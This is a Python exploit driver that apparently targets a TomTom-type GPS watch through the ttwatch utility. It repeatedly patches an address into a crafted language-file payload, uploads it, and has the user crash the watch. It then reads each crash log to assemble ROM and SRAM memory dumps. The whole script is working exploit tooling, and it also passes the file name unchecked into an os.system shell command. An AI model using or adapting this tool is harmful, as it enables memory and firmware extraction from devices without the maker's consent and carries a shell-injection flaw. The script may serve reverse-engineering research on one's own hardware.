#!/usr/bin/python3
import struct
import sys
import os

# <file> is the language file that contains the exploit payload
if (len(sys.argv) != 3):
	print ('usage: {:s} <file> <baseaddress>'.format(sys.argv[0]))
	sys.exit(-1)

dump_base = 0x00400000
ram_base = 0x20000000
dumpfile = "DUMP.bin"
ramfile = "SRAM.bin"

# Offset to change the base address for the dump in the payload file
offset = 0xe8
address = int(sys.argv[2], 0)
payload = sys.argv[1]

jump = 376

# main loop:

while (1):

	# Delete crashlogs on watch
	os.system('ttwatch --delete 0x00013000')

	print('patching {:s} with address 0x{:08x}'.format(payload, address))
	fh = open(payload, "r+b")
	fh.seek(offset)
	fh.write(struct.pack("<I", address))
	fh.close()

	print('writing file to watch...')
	os.system("cat " + payload + "| ttwatch -w 0x00810003")

	input('please disconnect and crash watch, press any key when watch reconnected...')

	print('reading crash file.')

	crashfile =  '{:08x}.crash'.format(address)
	os.system('ttwatch -r 0x00013000 > {:s}'.format(crashfile))

	fc = open(crashfile, "r+b")
	bindata = b''

	# filter out "Crashlog" word
	magicword = fc.read(8)
	bindata = fc.read(376)

	fc.close()

	if address >= 0x00400000 and address <= 0x00500000:
		print('ROM region, patching ROM file...')
		fd = open(dumpfile, "r+b")
		dump_offset = address - dump_base
		print('region offset is {:08x}'.format(dump_offset))
		fd.seek(dump_offset)
		fd.write(bindata)
		fd.close
	if address >= 0x20000000 and address <= 0x21000000:
		print('SRAM region, patching SRAM file...')
		fd = open(ramfile, "r+b")
		dump_offset = address - ram_base
		print('region offset is {:08x}'.format(dump_offset))
		fd.seek(dump_offset)
		fd.write(bindata)
		fd.close

	address = address + jump

